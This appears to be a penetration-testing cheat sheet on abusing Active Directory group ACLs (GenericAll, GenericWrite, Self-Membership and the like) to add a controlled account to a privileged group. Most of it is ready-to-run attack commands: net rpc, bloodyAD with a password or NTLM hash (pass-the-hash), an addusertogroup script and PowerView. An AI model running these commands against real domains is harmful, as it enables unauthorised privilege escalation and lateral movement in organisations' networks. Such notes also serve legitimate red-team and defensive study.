**this attack is possible when the controlled account has** `GenericAll`**,** `GenericWrite`**,** `Self`**,** `AllExtendedRights`, `Addself`**, or** `Self-Membership` **over the target group.**

Once we found the right user or group with one of these ACLs we can exploit it with the following commands

```sh
net rpc group addmem 'Vulnerable Group' otter -U domain.com/otter%'SomethingSecure123!' -S 10.10.10.10
# verify the changes took place
net rpc group members 'Vulnerable Group' -U domain.com/otter%SomethingSecure123! -S 10.10.10.10

bloodyAD --host "10.10.10.10" -d "domain.com" -u "username" -p "password" add groupMember 'groupName' 'userToAdd'
```

If we only have the hash for the user we can either use the [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit) or bloodyAD

```sh
bloodyAD --host "10.10.10.10" -d "domain.com" -u "username" -p "ffffffffffffffffffffffffffffffff:<NTLM_HASH>" add groupMember 'groupName' 'userToAdd'
```

We can also use the [addusertogroup](https://github.com/juliourena/ActiveDirectoryScripts/blob/main/Python/addusertogroup.py) script
```sh
python3 addusertogroup.py -d domain.com -g "Vulnerable Group" -a otter -u otter -p 'SomethingSecure123!'
```

From windows we can use powerview
```sh
Add-DomainGroupMember -Identity "Vulnerable Group" -Members otter -Verbose
```
